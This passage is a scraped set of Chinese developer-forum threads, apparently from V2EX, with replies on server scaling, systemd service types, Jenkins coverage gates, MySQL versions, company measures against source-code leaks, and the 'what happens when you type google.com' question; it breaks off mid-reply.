{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>现在两台 mysql 做了主从</p>\n<p>2 台服务器做了负载均衡</p>\n<p>都是部署在阿里云上</p>\n<p>pv 越来越大了，升级服务器的配置好还是增加服务器的数量？</p>\n<p>考虑到升级很方便 想选择直接升级配置 但是不知道后面会带来什么问题</p>\n<p>如果是增加服务器，后面维护的难度也会增加，并且需要修改一些代码</p>\n<p>各位大神给一些意见。</p>\n</div></div>"], "reply": "9", "tittle": "网站的 pv 越来越大，升级服务器还是增加服务器好？", "comment": ["预估一下流量增长，如果未来一年需要应对百倍流量，还是需要改代码，做分布式部署的准备，这样即使流量暴涨，也可以通过增加节点快速应付流量增长。\r", "\r", "如果只是两三倍的流量预增，那就先升级配置。", "建议增加服务器。原因：升级服务器是有限的，总有你升级到最顶配的时候；而增加服务器则是无限的；至于你说的维护成本，可以使用批量部署来解决的", "我只是单纯觉得，增加服务器可以学到很多好玩的东西，比升级服务器能折腾得多", "开发人员的角度来说肯定是要增加服务器，集群开发的实战经验肯定对成长大有好处。\r", "运营人员（非 DevOps) 的角度来说肯定是要升级服务器，方便。\r", "公司的角度来说看业务量的增长预期。我同意 #1 的观点。", "不同地区建立中间源", " \r", " \r", " \r", "网站就自己在做  接下来知道该怎么做了，暂时升级服务器，后面再慢慢开始增加服务器", "用 RDS ，别自己搭 MySQL", " 现在已经在用 RDS 了  扩展起来快", "如果是临时的业务量爆发肯定是升级服务器, 但长远考虑肯定是业务代码拆分 分别部署比较好. \r", "这样一方面是降低上线风险. 一个程序如果出了问题不用担心其他的程序.\r", "尤其是要求高可用的项目.\r", "比如说后台可以单独拆分为一个项目 放在一台配置很低的服务器就可以. 然后部署 vpn 这样更加安全 不用太多考虑安全性问题. 只要把控好使用 vpn 的人就可以. 这样你只需要关注一些对外访问的入口 做好监控程序 能降低很多风险."]},
{"content": ["<div class=\"topic_content\">是用 jenkins 搭建一个自动构建的项目，但是我想测试用例覆盖率大于 90%的时候，才算是成功，怎么弄了？\r<br>\r<br>自动构建的是python 代码</div>"], "reply": "1", "tittle": "jenkins 如何根据测试用例覆盖率发送报警邮件", "comment": ["写一段 py 逻辑调用 UT Coverage ，在覆盖率低于 90 时 non-0 ，在 Jenkins shell 脚本中返回$?"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我的操作系统是 Ubuntu 16.04.02LTS 是从 14.04 升上去的\n比如 squid ：\n/usr/local/squid/sbin/squid -s 是后台启动\n/usr/local/squid/sbin/squid -k shutdown 是关闭</p>\n<p>我新增了一个文件：<code>/lib/systemd/system/squid.service</code></p>\n<pre><code>[Unit]\nDescription=squid , a HTTP(S) proxy server\nDocumentation=https://blog.ruiruige1991.xyz\nAfter=network.target  \n\n[Service]\nType=simple\nExecStart=/usr/local/squid/sbin/squid -s\nExecStop=/usr/local/squid/sbin/squid -k shutdown\nExecReload=/usr/local/squid/sbin/squid -k reconfigure\n</code></pre>\n<p>然后每次执行<code>systemctl start squid.service</code>，发现都起不来</p>\n<p>执行<code>journald -xe</code> 发现有以下日志:</p>\n<pre><code>Mar 06 16:04:41 NyaVM-VPS-updwugzl systemd[1]: Started squid , a HTTP(S) proxy server.\n-- Subject: Unit squid.service has finished start-up\n-- Defined-By: systemd\n-- Support: http://lists.freedesktop.org/mailman/listinfo/systemd-devel\n-- \n-- Unit squid.service has finished starting up.\n-- \n-- The start-up result is done.\nMar 06 16:04:41 NyaVM-VPS-updwugzl squid[21867]: Squid Parent: will start 1 kids\nMar 06 16:04:41 NyaVM-VPS-updwugzl squid[21867]: Squid Parent: (squid-1) process 21870 started\nMar 06 16:04:41 NyaVM-VPS-updwugzl squid[21868]: squid: No running copy\n</code></pre>\n<p>个人感觉：</p>\n<ul>\n<li>很多时候起一个服务是起不来的</li>\n<li>不管我是否起来了，感觉它会在服务启动的一瞬间就去执行 stop 的相关任务</li>\n</ul>\n<p>有没有人有这方面的经验？</p>\n</div></div>"], "reply": "10", "tittle": "为什么我用 systemd 创建的服务全部都会自动关闭？", "comment": ["Type 改成 forking", " 能不能解释一下为什么呢？\r", "我之前也尝试搜过，有人说 simple 就可以了还说 forking 只是兼容老版本的程序，这个 forking 到底是什么意思啊", " 成功了！ \r", "能稍微说一下吗？ 或者说个关键技术我去谷歌 ", " ", " 在前台会阻塞的程序可以用 simple ，后台服务用 forking 。如果你想了解什么是 fork 请搜索 Linux Daemon 。", " #3 \r", "如果有耐心，看看 systemd 系列的 manpage, 讲得很详细。", " 你需要关注的是“为什么 forking 是兼容老版本”而不是“ forking 是兼容老版本”", "因为 squid 默认 fork 到后台执行\r", "simple 只检查前台进程，前台退了就意味结束了\r", "我记得加-N 可以不 fork\r", "forking 会尝试检测 fork 出来的后台\r", "此外还可以通过 pidfile 显式指定\r", "对于执行一遍就一直有效的，比如 RC local 脚本， one-shot", "因为这类东西的原理是由前台进程派生出守护进程后就退出，而 simple 只能检测你运行进程的状态", "“感觉它会在服务启动的一瞬间就去执行 stop 的相关任务”正是这种方式的显著特点，派生出守护进程后，控制台进程退出"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>这篇论文是去年我在 hn 上看到有人提的，感觉很有趣，基于“结构”（形状）生成 ascii 艺术，相比基于“色调”的方法，这种看上去更舒服，而且需要更少的字符来描绘一幅图片。当时仔细读了几遍，感觉论文有些地方写得很模糊，用 python 实现了下效果差得很( <a href=\"https://github.com/MacLeek/ascii-art\" rel=\"nofollow\">https://github.com/MacLeek/ascii-art</a>) ，发邮件问了问作者，然而石沉大海，就放着了。然后这两天又看了看，还是搞不懂里面一些地方，非常郁闷。。。</p>\n<p>论文在这：<a href=\"http://www.cse.cuhk.edu.hk/%7Ettwong/papers/asciiart/asciiart.html\" rel=\"nofollow\">Structure-based ASCII Art</a></p>\n<p>还有一份当时他们申请的中文专利，与论文一样： <a href=\"https://www.google.com/patents/CN102298767A\" rel=\"nofollow\">https://www.google.com/patents/CN102298767A</a></p>\n<p>有没有喜欢 ascii art 的朋友也来研究下啊？</p>\n</div></div>", "<div class=\"topic_content\">刚刚在 github 一搜，居然发现了有人写了一个，还是昨天上传的，看上去很棒！\r<br><a target=\"_blank\" href=\"https://github.com/OsciiArt/DeepAA\" rel=\"nofollow\">https://github.com/OsciiArt/DeepAA</a></div>"], "reply": "9", "tittle": "有没有喜欢 ascii art 的人一起来实现这篇论文的算法？", "comment": ["以前找 ascii art 在线网站很是头疼，每次现用现找。。", "ascii art 现在还有很多人用吗？", "这个倒是很有趣", "之前我也做过一个，不过我的就很原始了 ", " 这种他们称之为“ tone-based ascii art\"，其实也不错，就是分辨率要比较高才能显示清楚", "可惜了，目前 ", " 仓库里只有模型没有如何训练的代码。。", "= = 我所膜拜的一个 ", "很久之前搞了一个在线的:   ", " 你可以试试把我附言的那个项目搞成 web 版哦"]},
{"content": ["<div class=\"topic_content\">是这样的，现在接入了 3 家合作商（算上自己就是 4 家，假如 A,B,C,D ），也就是说有 4 个版本的代码。我现在的做法是一家一份代码，但是尴尬的问题是有时候一个新功能上来了，我在 A 里写了，然后可能 B,D 也要，我是用 Beyond Compare 对比着往别家里合并的。。。。</div>"], "reply": "7", "tittle": "版本太多用什么版本控制工具好", "comment": ["标准答案： git", "git + repo", "楼上已经说完了\r", "\r", "重复的功能，为什么不抽取出模块来呢？", "代码只做一份，做 flag 控制，在 ABCD 中使用不同的配置文件。", "先忽略代码冗余的问题\r", "当然是 git 啊\r", "直接 git remote add -> fetch -> cherry-pick 就完成合并\r", "用 svn 的话，你不导入到一个 repo 下没法 merge", "多谢各位的回复", "不要合并，要分库 git submodule"]},
{"content": ["<div class=\"topic_content\">在 Github 上做了一个 Vue 相关开源项目库汇总 <a target=\"_blank\" href=\"https://github.com/opendigg/awesome-github-vue\" rel=\"nofollow\">https://github.com/opendigg/awesome-github-vue</a> 基本做到很全很新了。对 Vue 开发感兴趣的欢迎 Star ，后续也会定期维护更新这个列表。当然，你也可以去 <a target=\"_blank\" href=\"http://www.opendigg.com/\" rel=\"nofollow\">http://www.opendigg.com/</a> 上看最新的收录。</div>"], "reply": "17", "tittle": "Vue 相关开源项目库汇总", "comment": ["难道官方整理的不够全吗。。", "谁来个 Angular2 的啊。。。", "赞", "官方的比较全，我们只是觉得收录的并不是特别的好，好多 star 都是 0 的也包含了，我们根据 star 进行了排序，也算提供了另一个选择了吧。", " 这个我们后续也可以弄 现在积累的还不是很多。", "厉害了，挺多的", "尽然没有我的 demo 哈哈 <", ";", "爬取就爬取，能不能不乱改 README 啊。。", " 竟然", "好，活脱脱的 Markdown 程序员。", " 哈哈，也 200star 了，加上吧", "赞", "\r", "\r", "\r", "\r", "好想被加上啊 @", "Vue 库真是不少了， angular2 的怎么没人搞几个", " \r", " 近期安排收录", " thx~"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>计算机网络方向，电子科大，目前研二，正值找实习关头。面临一个艰难的人生抉择，望各位大大指点迷津。</p>\n<p>首先，自己去年与 bd 有项目合作，然后，今年 bd 希望我直接去实习。合作的项目与 SDN 相关，主要开发语言为 Java 。个人从大三开始一直专于 C 和 C++，内心更偏向于从事 C++开发工作（后台开发，系统开发，软件开发等）。对 Java 和 SDN 开发不是很排斥，也不是很执着。</p>\n<p>另外，本人四川本地人，倾向于毕业留成都。去帝都工作是自己心中不得已选择中的不得已选择。</p>\n<p>谈谈自己对于实习的看法。</p>\n<ul>\n<li>\n<p>去实习，如果去 bd 工作，留下来的机会较大，起码能有个保底 offer 。但是实习期间（ 7/8 月份）估计会耽误其他公司的校招，尤其是成都这边的公司。因此，估计会影响自己的留成都大计。</p>\n</li>\n<li>\n<p>不去实习，认真看书，巩固基础知识（目前自己在 sdn 、 linux 内核、分布式以及 qt 上有一些项目经历），刷刷题，编编码，全身心投入校招准备。这样的话，基本不会错过校招。但是，没有实习，简历上少一笔，同时，没有保底 offer ，会感觉亚历山大。</p>\n</li>\n</ul>\n<p>谈谈近况：导师允许实习，自己也在找除了 bd 之外的其他公司的实习。</p>\n<p>如上，麻烦大家给我这只迷路的羔羊以人生的建议。谢谢啦。</p>\n</div></div>"], "reply": "31", "tittle": "求助：实习还是不实习？", "comment": ["请先把 985 211 这些去掉", "看你自己有没去 bd 的意愿吧，个人建议刚毕业多到一线城市历练历练", "我觉得可以先去 bd 实习，然后回成都校招，成都这边有腾讯，阿里，华为的分公司都挺不错的。", " 嗯嗯，谢谢。主要是自己对 SDN 的发展的看法是未来五到六年其必然还是集中于沿海一线城市。如果从事 SDN 的开发工作，从沿海一线回成都发展会有所阻碍。", "成都的话，楼主莫非想去腾讯\r", "\r", "反正我是主推实习的，羡慕有个开明的导师", " 看了三遍也没看到 985 211 。。。", " 谢谢，自己初来的想法也确实如此。但是，我觉得实习的繁忙可能会影响找工作前的准备，尤其是一些基础知识的积累。", "楼主写了个“来自成都某 985 学校”，可能触动一楼神经了。", " 哈哈，我已经重新编辑了哈。", " 对啊，成都腾讯是工作的首选之一。可惜自己在游戏开发、 hadoop 方面没有什么开发和实践经历。十分感谢您，我也觉得实习的话，如果能有所为，倒是极为增长见识的，同时也能极大帮助找工作。", "个人觉得，不一定要赶校招\r", "电子科大路过，哈", " 怪不得，手速挺快的啊", " 题主删除了，原文：计算机网络方向， XXX 985 XXXXXX,XXXXXXX", " 并无恶意", " O(∩_∩)O~~", " 嗯嗯，总是感觉这种情况下的实习其实一种“到底是摘香蕉还是掰玉米”的抉择，有利有弊。", " 为什么要去掉", " O(∩_∩)O 哈哈~", " 为什么要去掉 \r", "通过得来的学校 就是比专科普通本科好", "sdn 老玩家路过", "成都啥时候都可以回，帝都只能去一次，我现在很后悔没有去帝都看看，留在上海。何况是成都\r", "实习给校招加分，不排除会影响校招复习，但是可以加点班，我就是这样\r", "\r", "另外 bd 是啥，百度？\r", "\r", "去帝都吧，校招可以找其他的帝都公司啊，你目前是感觉不到帝都和其他地方的技术差距的。晃一圈回来呗", "看了半天才知道 BD 是百度。", "校招主要看个人能力，实不实习也不是很重要了。\r", "不实习，可以刷刷题，算法题假如没有 ACM 背景，确实需要大量时间训练。", " #8 可能是一楼觉得楼主没有表述清楚，成都应该有俩 985 。", "个人建议去吧 趁年轻先去折腾 毕竟大公司学到东西更多 机会更多 你可以先去外边折腾两三年 再回成都", " 看了你的回复才知道 bd 是百度😢", " 嗯，非常感谢。诚然，我个人也觉得年轻时多去大城市闯闯，能丰富人生阅历，增长见识。", " 是的，自己算法较弱，会基本的算法和数据结构，但是刷题时总觉得很吃力（常常需要看 discuss 来完成一些题目）。", " 嗯嗯，感谢。其实自己倒不排斥在外面闯荡（毕竟年轻嘛，又没 GF ！！！），只是不知几年年成都的 SDN 产业是否具有发展潜力，因此有些徘徊。", "去实习", "一般情况下，实习对找工作很有优势。"]},
{"content": ["<div class=\"topic_content\">我想知道目前防代码泄漏的措施都到什么地步了。</div>"], "reply": "93", "tittle": "大家公司里都有什么样的措施来防止代码泄漏？", "comment": ["一大堆手段，比如什么不接外网，不给 USB 接口，远程登陆服务器虚拟机开发，代码后缀名文件如·java 创建的时候直接加密，即使上传了也是乱码。这些都经历过。求补充…", "大公司指的是 google FB 这类还是老牌 ms ， ibm ， hp 之类，或者混合型如 apple 。 起码我看到的新闻， google 并没什么特别措施，他们家 20 亿行代码存在一个 repo 里。工程师都能访问，只有极少数代码是需要高级别人员才能访问。  你想偷先得花时间研究明白代码到底在哪里。 另外投了这种代码又有什么用？ map reduce 这个代码你拿到 google 原版和 hadoop 来跑有什么区别？如果有兴趣可以看看 acm 的文章，讲 google 家代码的\r", "\r", "至于 ibm 和 hp 这类有硬件类的，防止泄密的都差不多，物理隔绝，不让带移动存储等等。发现有人泄密，花巨额律师费也要把这人送进监狱，以儆效尤。 总之就是胡萝卜加大棒。 \r", "apple 家不懂\r", "\r", "没保护，笔记本都可以带回家", "看错了，请忽略我的回复", "让大家把代码写的奇烂无比，泄露了也看不懂。", "除了部分核心安全代码，其他所有代码公司内均可查阅 review", "保密协议，底层代码对应用层只提供接口", "说的就像那么多垃圾代码有人用似的", " 不接外网如果要 yum install 怎么解决？", "没什么特别的保护，只有一些关键账号证书不公开，只有少数人知道", "核心部分代码能看到的就那几个人，其他的人都没有权限，只有接口可用", "各种蛋疼措施。唉。。。", "泄露了又能怎么样，不是你拿到人家代码就能颠覆人家的，所以没啥用", "随便拿，弄明白那些垃圾代码是干啥的，算你厉害", "规则都是防君子，防不了小人", " yun install 以及其他的依赖管理工具可以做内网镜像，速度也比国内直连快。", " ，不接外网和杜绝 USB 是根本办法，但有时候难免要查网上的资料，如何解决？另外蓝牙有些人要用鼠标，不禁用也可以通过蓝牙传。", " 你是说服务器安装软件是吧？一样不能 yum 不过可以插 USB ，自己下 RPM 包或者源码编译解决", " ,我说的是员工自己在个人电脑上安装软件，毕竟每个人要用的工具偏好不同。如何让员工拿到自己想要的工具但又把外网给断掉，这是矛盾的。", "多分几个代码仓库而已。", "垃圾代码谁用谁知道。。。工作做的是经验，不是那点垃圾代码。。现在随便一个弄的好的开源程序都比公司的代码好一百万倍。", " 可以在内网自己创建源", " 多几台电脑就行了。一台连外网查资料，一台只能内网开发。工具？你要什么工具？", " 我知道的是搞一台机器能上网，谁需要上网就去那个屋子里单独上网，查完资料再回到自己的机器", "除了 git 、 svn 的账户、权限，都不设限，得靠职业道德，另外没有服务端，拿了没用啊。", " 一般都是禁掉邮箱，网盘", "没保护，甚至上家公司的代码完全开源在 github （除核心业务）", "大家都那么忙，谁有时间看你的烂代码。  逃", "云开发平台，除了照相，无解╮(╯▽╰)╭", "技术上控制是一方面，还要来点法律措施，比如签个保密协议之类的", "全公司 Windows ，域管理。\r", "不能用 U 盘，不能直接上网，必须要 3389 到 4 台服务器上才能上网，这 4 台服务器每个星期随机分配。上传下载都必须通过 NAS 中转，而 NAS 上有扫描程序，每分钟扫描备份，发现特定后缀都会报警（发邮件通知部门主管、老板［香港人］、运维、安全部门主任），运维每个星期都会复查这类文件。\r", "\r", "安装或者使用任何软件必须写一个备案表，每个星期检查电脑上面装了什么用了什么。以前还不允许使用盗版软件、破解版、绿色版、各种修改版，现在买不起太多，就不理了。\r", "\r", "电脑断网监控、想通过接自己的路由的话，断网就被发现了（因为太多人有事没事重启电脑，现在这条没用了）。\r", "\r", "到处都是摄像头，不能带电脑、笔记本等东西进出公司，\r", "如果京东买的那些到公司的，必须要到前台写放行条(●°u°●)​ 」，还要说明为什么", "今天刚有同事离职，我还没告诉他不要把代码泄漏了，后来想想这些代码写得很烂，无所谓了，有空闲时间我整理下传 GitHub😅", "我们小公司没怎么管。。。\r", "现在我想想，这代码我拿出去也没什么卵用，太小众了。", "理论上来说只要你能接触到代码就没有办法完全阻止泄露的可能性，但提高相关操作的成本还是可行的 要不你把代码背下来？", "so", "代码不值钱， 还有你入职签的保密协议你以为没啥约束效果吗？", "开发人员远程虚拟机开发, 虚拟机的的东西只能进不能出, 要出必须通过高层审核通过,全员机器加密, 所有拷出的东西加密", "物理隔离，不只是因为代码要保密 :-)\r", "半导体行业软件的 license 比较贵，所以绝大部分公司都用的盗版，如果被 EDA 软件公司的人发现了要给钱，哈哈\r", "\r", "据说海思之类的大公司也是买几个正版 license ，然后自己搞一大堆盗版的 license 用，有问题了还能找技术支持", " AD 么哈哈哈~~\r", "我们的硬件图纸什么的都在内网， PCBdoc 可以拷出来给厂家制作。\r", "剩下的基本上都是各种报告和验证之类的。。。现在都在自己的电脑里。\r", "虽然第一页上都有版权声明吧。。。。。", " 建个源就行了", " 用手机浏览看到就直接点回复了，楼上的同学已经回答了", "把代码写的要多烂有多烂，一般人都望而却步，以此达到放泄露的目的。", "给的钱够多+劳动合同", "以前公司，外企，靠法律。泄露机密的人会被告到底。", "只有一款软件 EIS 终端\r", " 代码不能复制到 QQ 聊天框里", "云内开发，只能进不能出，代码垃圾得成狗屎，谁有病才要这代码，不行了，我先吐一会", "除了核心代码  其他代码 各种限制  我觉得是老板或者管理有心理疾病……\r", "这些垃圾代码谁会看？", "目前没保护（但他们应该想保护），我用自己的笔记本。\r", "公司电脑配置不给力，怪我咯。", "严格来讲，回答了这问题，也算泄密吧", "垃圾代码，除了安全相关的，几乎没有价值", "没办法 ， 不怕贼偷，就怕贼惦记", " 你必须得整理下才能上传到 github 上呀，这个可是你的 github 门面呀", " 只能下载不能上传", "不防止，其实真心没意义。\r", "\r", "在上上家公司时，还说服同事，直接把项目代码打包送给兄弟部门（他们也做类似业务）。结果呢？谁愿意看啊，还指望大家一起完善成一个标准项目框架呢。\r", "\r", "可重用性高的系统级代码（不牵涉具体商业业务与安全），尽量考虑开源，没准还能碰上爱好者帮助审计和完善。当然，了了无已也是事实。\r", "\r", "据说全 Google 用一个大 Repo ，作为 Google 的雇员你能看所有的公司代码。 So, what.  这样你就自己 copy 个搜索引擎公司，然后打败 Google 么？", " 我司与你说的一模一样。。。尤其是后缀名相关文件加密，搞得有时候我 IDE 都打不开代码文件", " 貌似这不可能吧，发送下载请求也是上传数据啊？", "代码像坨屎就自然不用泄露了 。。。。 233333", " ,如果 100 个员工就开 100 个虚拟机么？", " ，既然 3389 到远程桌面，我登陆一个网页邮箱发送文件，你如何能知道？", "真不需要保护呢", "这种事情没法一概而论的。\r", "\r", "比如前司，对代码产品化不是很在意，我离职前，领着交接人把代码在新机器上装了好几遍，每次都得好几天才能跑顺。这还是我自己写的代码，我自己去装。这种代码，给大家大家都懒得看。\r", "\r", "但是有些公司，尤其是做金融军工之类的，他们不是怕代码被别人用，而是怕被攻击。所以只能登录到开发机，不能上网不让插 U 盘都是很正常的。", "除非核心如加密算法之类的，其它的我们根本不怕代码泄露，拿了你也跑不起来，跑得起来你也没客户", "啊，代码需要保密？就我这水平接触的代码基本都是靠网上搜索东拼西凑来的，根本不存在是否泄密，一般来说要保护的是数据", " 有个虚拟机平台, 要开多少台都没问题的", "无保护，靠保密条款", " MultiPoint 可以让多个用户远程到同一个机器，在不同用户里面", " 用 Hibernate 实现的 Repository, 后来写 C#, 用 NHibernate 也实现了一下, 因为 C# 语言的优势, NHibernate 使用起来更方便", "其实代码不重要  数据才是重要的", "保密协议。\r", "\r", "公司三十年源码随便访问。每个工作位都有百兆光纤网络，全靠法律意识。", "一般代码确实没卵用，有代码你能跑起来？跑起来你就干倒老东家了？数据库里面那东西拷出来才牛逼，光卖信息也能发一笔横财，只不过危险系数也高。", "还有那些什么破公共库，轮子啥的，开源的比那垃圾代码好好多倍。", "看了上面的回复就放心了，原来不止一家的代码写的跟屎一样，哈哈", " 你在远程只能发你远程上面的东西\r", "公司内网的资源你是没办法偷出去的，因为公司内网跟外面联通的唯一方式就是那个 nas ，你必须把文件复制到上面去才能在远程上面找到这个文件。而 nas 上面你只有写权限，没有删除权限，并且后台有系统扫描你的目录，只要发现你上传了东西到 nas ，就会报警。\r", "不过原来的权限系统有漏洞，导致部分人是可以删除自己上传的文件的，唔使曾经就有两个人不怕死，把两个模型文件复制上去，通过邮件发到外网去，马上被公司发现，然后报警了。\r", "最后这两个人到公证处去做了公证，保证文件已经删除说以后只要发现有任何人在任何地方出现这个模型文件，将承担经济损失之类的。然后据说老板觉得还不够，又给这两个模型申请了专利。", "SPES", "代码没那么重要，数据才重要，基本上你能写出来的别人也能写出来。", " 哈哈，我也是这么想的。大家都这么忙，谁有空看那么烂的代码", "办公不用物理机，用虚拟桌面办公", "哈哈,防止不了的,开发和运维合伙的话,数据库都可以拿走.", "必须是物理隔离，做 air gap 啊，然后所有的项目文件放到配置管理服务器上，冷备，热备，专线连通的异地容灾各种齐全。干活之前都是先从配置库里面 pull 下来，然后做一点， commit 一点，也方便统计工作量，本地电脑炸了都没关系，所有的资料都在服务器，重新部署也简单，最坏情况下即便丢失也就丢失上一个 commit 到现在的内容（基本不可能）。本地干活儿的电脑随时都可以换，任意机器都可以。所有 U 口，串口全部封掉，交换机做端口管理，必须要装了客户端授权才可以接入网络，未授权的电脑一旦用网线连接， MAC 地址自动记录，然后立刻召唤与该该端口挂钩的责任人，二级泻秘事故处理。", "nda ...", "网络物理隔离，禁 USB ，禁无线网卡，除了手机拍屏幕外我也想不到什么其他办法了", "物理隔离，安全审计，关键操作全程录像", "新鲜的  下午刚刚全员发的消息 说公司代码被人放到 GitHub 了 然后 下午下班后 公司大墙加高了一层 所有即时通讯都上不去了 包括公司办公的 rtx 以及公司的邮件  访问个别存储类网站 会出现提示 说访问的内容涉及存储啥的 按规定不让上", "硅谷一些大公司，在家就能访问所有代码，还不用拨 VPN ，直接公网就可以。", " 不会这么 6 直接都被上传到 github 上了吧", "没卵用，不是 google 给你代码, 你就能再建立一个 google ，公司的价值在于人", "我感觉业务代码值得保密的也就是加密算法之类的烧脑代码了吧。。。普通流程代码要来干蛤。莫不是用来找 bug?", " 估计是有人传上去了 具体情况没说", "代码就算是泄漏了，没有对应的环境依赖什么的，也未必能运行起来啊。。。", " \r", "\r", "金融量化类相关的么？ 还是军厂之类？\r", "一般行业的业务代码要这么搞，心疼贵司码农的心理健康。", "表演的各位都不报行业、不说业务，我也是服了……\r", "\r", "这帖子里的一些鸡贼手段被外行 manager 看到照葫芦画瓢就问将来你们怕不怕。", " 习惯就好了。最要命的是不让上外网，手机没有摄像头，要上网查个什么东西用的老 wap 上网 baidu 的。。。", " 对的，代码本身就不值几个钱～ 就算给你看你也不定会看辣鸡代码～ 偏底层看不看得懂还是个问题～ UE4 都开源了，你看了又有何用呢～"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>目前四十多万行的数据，部署 MySQL 就在 MySQL 版本之间选择困难，实际运营中读远大于写，在网上查了查，貌似 MySQL 各个版本褒贬不一，有的说 5.6 查询比 5.5 还慢，有的说 5.7 占用内存太高。。。求 V 友过来人说说哪种版本 最好？服务器内存 2G</p>\n</div></div>"], "reply": "27", "tittle": "实际项目中， MySQL5.5、 5.6、 5.7 到底哪个最好？", "comment": ["没历史问题的话用最新的稳定版， 5.7 的内存问题已经修复了的", "最新版", "没有历史遗留问题就最新版。", "不用 8 ？", "5.8 - -", "四十多万的行的数据，还在用 2G 内存。。。不应该提升一下内存吗老哥 ", " ", " 访问量不太高，所以内存占用也不会太高， 2G 够了，不够了可以弹性升级", "最新的稳定版。", "同上，最新稳定版。", "四十多万行，要是我就用 SQLite ……", "四十多万行的数据……", "闲的蛋疼，四十多万数据还讨论个毛？  Access 都没问题，有这发帖的功夫代码都写完了", "随便都行啊。", "最新稳定版呗", "就四十多万的数据, 随便用哪个, 没什么好纠结的.", "别人遇到的问题 大部分情况下 都是比你多一个两个量级才会遇到的。\r", "所以你完全没必要纠结，哪一个安装起来方便就用哪个", "楼上说 40 万数据不用讨论，我说玩 2G 内存的，你真的想的太多了，这个服务器和项目不适合你。", "还得看你的服务器硬件配置、文件系统、磁盘读写速度和 IOPS 等，配置基础不行，再怎么换 MySQL 版本也不可能有大质的飞跃。", " 读大于写, 索引很重要, 还有 mysql 配置文件优化. 这两个搞定了, 随便哪个版本几百万的数据无压力.\r", "\r", "不过前提是表的设计不要太反常规", "服务器默认 install 的就是最佳版本，不要听上面最新版的误导", "不用 mariaDB?", "Maria10 ……", "maria", "最新的稳定版 +1", "5.7", "40 万数据，上个 SSD 。硬件上去一点，马上见效果。", "目前用的 5.7"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>这是一道古老的面试题，不过我们不再局限于平常的回答，而是想办法回答地尽可能具体，不遗漏任何细节。 GitHub 上已经有人整理了相关技术细节，详情请点击左下角阅读原文。</p>\n<p><a href=\"https://mp.weixin.qq.com/s?__biz=MzIzMDc5NzUwNg==&amp;mid=2247483652&amp;idx=1&amp;sn=658cd37e07d09c9da30854fb30467d82&amp;chksm=e8acb8a9dfdb31bfcea4ea4f91bb83d5bea329ef75a2ebd6281b9d0a0f6dc604b9455aed87e4&amp;mpshare=1&amp;scene=23&amp;srcid=03056Pd20LNHSk0d44wdgW3j%23rd\" rel=\"nofollow\">https://mp.weixin.qq.com/s?__biz=MzIzMDc5NzUwNg==&amp;mid=2247483652&amp;idx=1&amp;sn=658cd37e07d09c9da30854fb30467d82&amp;chksm=e8acb8a9dfdb31bfcea4ea4f91bb83d5bea329ef75a2ebd6281b9d0a0f6dc604b9455aed87e4&amp;mpshare=1&amp;scene=23&amp;srcid=03056Pd20LNHSk0d44wdgW3j%23rd</a></p>\n</div></div>"], "reply": "52", "tittle": "当你在浏览器中输入 ", "comment": ["少了一步，路由。这些数据包经过数个路由器，最后被路由到一堵墙上，返回了一个消息，又被路由回楼主的浏览器，显示 `Connection reset by peer`.", "TCP 包被切开封装成 IP 数据包……\r", "……\r", "转成二进制……\r", "……\r", "线路上使用频分 /时分复用……\r", "………………\r", "到达交换设备 /路由器……\r", "……", " 也有可能 DNS 解析到的 IP 根本就不可达  😄", " 很久以前还没 DNS 污染这回事，那时候访问不存在的网站都是这个消息 :D", "电脑试图解析域名\r", "电脑发送了 DNS 解析请求\r", "数毫秒内得到了一个阿塞拜疆的 IP 地址返回\r", "尝试访问，失败\r", "卒", "路由器回应： Non-existent domain ， 卒", " 我们这一代还算好的，至少还体验过真正的互联网， 00 后才是真正的局域网", "Connecting...", "1 、浏览器发送 ", " 域名解析请求；\r", "2 、递归 dns 返回僵尸 ip ；\r", "3 、完。", "真是为难程序员……", "不仅面试题。。当年我们考 OS 的时候最后一题就这个。。", "当前公司的面试题里面有类似的题目。", "至于出这种题目的原因，可能是有的来面试的人根本不知道 dns 这么个东西。", "至少我面试的人中有不少不知道 dns 。", "出现 404", "去年期末考试题", "面试必备，翻译的很到位", "域名被解析到沙特阿拉伯， Over.", "90 年代末的时候有些网络本来就是局域网，因为运营商不想承担国际流量结算带来的费用。这种情况持续到谷歌被墙都存在。", "先从薄膜键盘 ，中断 ，总线   cpu 指令等说起。", "internet 会 break down", "dns:不存在的，丢人，你退网吧", "ACK->\r", "<-RST\r", "<-SYN\r", "\r", "🙁", "是不是还漏掉了 GFW 的部分？", "应该是，解析到 ", " 的域名，然后 PAC 列表中查找，命中，把请求发到本地的 1080 端口，本地 server 再把请求转发到某个搬瓦工的机房的电脑上，这台机器帮我访问 ", " 后把结果返回给我。", "发生了什么？发生 keydown 事件。完毕：）", "无法访问此网站\r", "\r", " 的响应时间过长。\r", "请试试以下办法：\r", "检查网络连接\r", "检查代理服务器和防火墙\r", "ERR_CONNECTION_TIMED_OUT\r", " ", "   ", "   ", "   ", "   ", " ", "这帖子里面智障的说 404 的终于没几个了，欣慰", "有本事就讲讲 \"当访问 Google 的时候,GFW 做了什么?\" \r", "\r", "GFW 做什么对屁民来说是黑盒,把黑盒里的技术原理讲清楚才叫 NB .", "发生了:\r", "1. 请求 ", "\r", "2. 被 Q\r", "3. 提示无法访问...", "我发了一个 pull request ，楼主可以看看。", "真正能完整答出来的肯定是早期在微软各个部门混过的，然后给 chrome 提交代码的，当然他如果是个中国人肯定也在数字公司、方正或神州数码混过。", " 20x00cn40f", "图片挂了？好吧，站在梯子上，所以成功看见 GOOGLE 的首页被打开了……", " 希望病魔早日战胜方校长", "由于 google 是商业站点， gws 发现你没有带 www ，返回 301 到 ", " gws 发现你没有用 https ，返回\r", "Alt-Svc:\"quic=\":443\"，让你走 https 。", "还以为 google 可以直接访问了 : )", "楼上漏了一步\r", "- DNS 提供商记录了 lz 的行为\r", "- 老大哥看着 lz", "当时是计网的最后一道题，侧重点在网络的那些层上。", "发送到 DNS 服务器\r", "\r", "被墙\r", "\r", "返回 超时或者 404", "404 GG", "Google 官网\r", "Gmail\r", "Google 学术搜索\r", "Google 地图\r", "Google 图片\r", "...\r", "相关软件...\r", "相关网站...\r", "网虫们在关注...\r", "...\r", "相关搜索\r", "...\r", "帮助  举报   给百度提建议", "你们都没有说如果浏览器和 